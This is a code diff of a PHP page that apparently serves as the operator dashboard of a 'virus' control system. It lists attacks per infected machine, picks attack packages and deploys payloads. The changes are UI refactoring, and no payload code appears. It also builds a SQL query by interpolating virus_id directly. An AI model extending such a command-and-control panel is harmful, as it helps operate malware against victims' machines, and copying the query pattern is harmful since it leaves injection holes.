@@ -14,6 +14,7 @@ use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\initializeArray;
 use function Kelvinho\Virus\map;
+use function Kelvinho\Virus\niceCost;
 
 /** @var PackageRegistrar $packageRegistrar */
 
@@ -30,25 +31,26 @@ function displayTable(array $attack_ids, array $visibleFields, AttackFactory $at
     if (count($attack_ids) === 0) { ?>
         <p>(No attacks)</p>
     <?php } else { ?>
-        <div style="overflow: auto;">
-            <table>
-                <tr><?php
+        <div style="overflow: auto;" class="w3-card">
+            <table class="w3-table w3-bordered w3-border w3-hoverable">
+                <tr class="w3-white"><?php
                     echo in_array(0, $visibleFields) ? "<th>Name</th>" : "";
                     echo in_array(1, $visibleFields) ? "<th>Package</th>" : "";
                     echo in_array(2, $visibleFields) ? "<th>Hash/id</th>" : "";
                     echo in_array(3, $visibleFields) ? "<th>Executed time</th>" : "";
-                    echo in_array(4, $visibleFields) ? "<th></th>" : ""; ?>
+                    echo in_array(4, $visibleFields) ? "<th>Cost</th>" : "";
+                    echo in_array(5, $visibleFields) ? "<th></th>" : ""; ?>
                 </tr>
                 <?php foreach ($attack_ids as $attack_id) {
                     $attack = $attackFactory->get($attack_id);
-                    $onclick = "onclick = \"redirect('$attack_id')\"";
                     $timezone = $user->getTimezone();
-                    echo "<tr style=\"cursor: pointer;\">";
-                    echo in_array(0, $visibleFields) ? "<td><a $onclick>" . $attack->getName() . "</a></td>" : "";
-                    echo in_array(1, $visibleFields) ? "<td><a $onclick>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</a></td>" : "";
-                    echo in_array(2, $visibleFields) ? "<td><a $onclick>" . formattedHash($attack->getAttackId()) . "</a></td>" : "";
-                    echo in_array(3, $visibleFields) ? "<td><a $onclick>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a></td>" : "";
-                    echo in_array(4, $visibleFields) ? "<td><a onclick = \"deleteAttack('" . $attack->getAttackId() . "')\">Delete</a></td>" : "";
+                    echo "<tr onclick = \"redirect('$attack_id')\" style=\"cursor: pointer;\">";
+                    echo in_array(0, $visibleFields) ? "<td>" . $attack->getName() . "</td>" : "";
+                    echo in_array(1, $visibleFields) ? "<td>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</td>" : "";
+                    echo in_array(2, $visibleFields) ? "<td>" . formattedHash($attack->getAttackId()) . "</td>" : "";
+                    echo in_array(3, $visibleFields) ? "<td>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</td>" : "";
+                    echo in_array(4, $visibleFields) ? "<td>$" . niceCost($attack->usage()->getMoney()) . "</td>" : "";
+                    echo in_array(5, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteAttack('" . $attack->getAttackId() . "')\">Delete</button></td>" : "";
                     echo "</tr>";
                 } ?>
             </table>
@@ -65,7 +67,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <html lang="en_US">
 <head>
     <title>Virus info</title>
-    <?php echo HtmlTemplate::header(); ?>
+    <?php HtmlTemplate::header(); ?>
     <style>
         #dailyChartDiv {
             position: relative;
@@ -79,6 +81,10 @@ $user = $userFactory->get($session->get("user_handle")); ?>
             margin: auto;
             width: 40vw;
             display: inline-block;
+        }
+
+        .w3-table td {
+            vertical-align: inherit;
         }
 
         @media only screen and (max-width: 900px) {
@@ -127,7 +133,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <label for="profile">Profile</label>
 <textarea id="profile" cols="80" class="w3-input"><?php echo $virus->getProfile(); ?></textarea>
 <br>
-<div class="w3-button w3-red" onclick="updateVirus()">Update</div>
+<button class="w3-btn w3-red" onclick="updateVirus()">Update</button>
 <h1>Activity</h1>
 <div>
     <div id="dailyChartDiv">
@@ -145,16 +151,18 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <label for="attackName">Name. This is an optional short name to help you stay organized</label>
 <input id="attackName" class="w3-input" type="text">
 <br>
-<div class="w3-dropdown-hover w3-light-grey" style="margin-right: 15px;">
-    <button id="attackPackage" class="w3-button">Choose attack package</button>
-    <div class="w3-dropdown-content w3-bar-block w3-border">
+<div class="w3-row">
+    <!--suppress HtmlFormInputWithoutLabel -->
+    <select id="attackPackage" class="w3-select w3-col l10 m9 s8" name="option" style="padding: 10px;">
+        <option value="" disabled selected>Choose attack package</option>
         <?php map($packageRegistrar->getPackages(), function ($package) use ($packageRegistrar) { ?>
-            <a onclick="changePackage(<?php echo "'$package'"; ?>)"
-               class="w3-bar-item w3-button"><?php echo $packageRegistrar->getDisplayName($package); ?></a>
+            <option value="<?php echo "$package"; ?>"><?php echo $packageRegistrar->getDisplayName($package); ?></option>
         <?php }); ?>
+    </select>
+    <div style="padding-left: 8px;" class="w3-col l2 m3 s4">
+        <button class="w3-btn w3-block w3-red" onclick="continueAttack()">Continue</button>
     </div>
 </div>
-<div class="w3-button w3-red" onclick="continueAttack()">Continue</div>
 <?php map($packageRegistrar->getPackages(), function ($dbName) use ($packageRegistrar) { ?>
     <p id="packageDescription-<?php echo $dbName; ?>" class="packageDescriptions">Package
         description: <?php echo $packageRegistrar->getDescription($dbName); ?></p>
@@ -162,21 +170,21 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <div id="message" style="color: red;"></div>
 <h2>Background attacks</h2>
 <h3>Offline</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
 <h3>Online</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
 <h2>One time attacks</h2>
 <h3>Dormant attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
 <h3>Deployed attacks</h3>
 <p>These are attacks that was sent to the virus, but the application hasn't heard a response from it yet. It could
     be that the virus hasn't noticed it yet, or it is executing and it's taking a long time. Or right when the virus
     is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
     here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
     over again.</p>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
 <h3>Executed attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
 <h2>How to choose?</h2>
 <p>Oh hey, you're the new guy again. Don't know what attack packages to choose from? No worries, here is a quick
     guide.</p>
@@ -262,16 +270,14 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <p>When you deploy an attack, it takes time for the virus to execute the attack, so be patient with it, and
     refreshes the screen to see whether it has reported back or not.</p>
 </body>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<?php HtmlTemplate::scripts(); ?>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/chart.js@2.9.3/dist/Chart.min.js"></script>
-<script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
-<!--suppress JSUnusedGlobalSymbols, JSValidateTypes -->
 <script type="application/javascript">
     const gui = {
         packageDescriptions: $(".packageDescriptions"),
-        attackPackage: $("#attackPackage"),
         message: $("#message"),
-        attackName: $("#attackName")
+        attackName: $("#attackName"),
+        attackPackage: $("#attackPackage")
     };
 
     function updateVirus() {
@@ -296,16 +302,15 @@ $user = $userFactory->get($session->get("user_handle")); ?>
             return "\"$dbName\": \"" . $packageRegistrar->getDisplayName($dbName) . "\"";
         })) ?>};
 
-    function changePackage(packageDbName) {
-        gui.attackPackage.html(packageNames[packageDbName]);
-        gui.attackPackage.attr("name", packageDbName);
+    gui.attackPackage.change(function() {
+        const packageDbName = gui.attackPackage.val();
         gui.packageDescriptions.css("display", "none");
         $("#packageDescription-" + packageDbName.replace(/\./g, "\\.")).css("display", "block");
         gui.message.html("");
-    }
+    });
 
     function continueAttack() {
-        if (gui.attackPackage.html() === "Choose attack package") {
+        if (!gui.attackPackage.val()) {
             gui.message.html("<br>Please choose an attack package first");
             return;
         }
@@ -322,7 +327,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
             type: "POST",
             data: {
                 virus_id: <?php echo "\"$virus_id\""; ?>,
-                attack_package: gui.attackPackage.attr("name"),
+                attack_package: gui.attackPackage.val(),
                 name: attackName
             },
             success: function (response) {
@@ -335,7 +340,10 @@ $user = $userFactory->get($session->get("user_handle")); ?>
         });
     }
 
+    let clickHold = false; // prevent the delete button click from triggering the tr click
+
     function deleteAttack(attack_id) {
+        clickHold = true;
         $.ajax({
             url: "<?php echo DOMAIN; ?>/vrs/<?php echo $virus->getVirusId(); ?>/aks/" + attack_id + "/ctrls/delete",
             type: "POST",
@@ -346,6 +354,10 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     }
 
     function redirect(attack_id) {
+        if (clickHold) {
+            clickHold = false;
+            return;
+        }
         $.ajax({
             url: "<?php echo DOMAIN_CONTROLLER; ?>/setAttackId",
             type: "POST",
@@ -365,14 +377,10 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 
     function getUptimes(string $virus_id): array {
         global $mysqli;
-        // fetching uptimes
         $uptimes = [];
-        $answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"$virus_id\" order by unix_time");
-        if ($answer) {
-            while ($row = $answer->fetch_assoc()) {
-                $uptimes[] = ["unix_time" => (int)$row["unix_time"], "active" => (int)$row["activeI"]];
-            }
-        }
+        if (!$answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"$virus_id\" order by unix_time")) return [];
+        while ($row = $answer->fetch_assoc())
+            $uptimes[] = ["unix_time" => (int)$row["unix_time"], "active" => (int)$row["activeI"]];
         return $uptimes;
     }
 
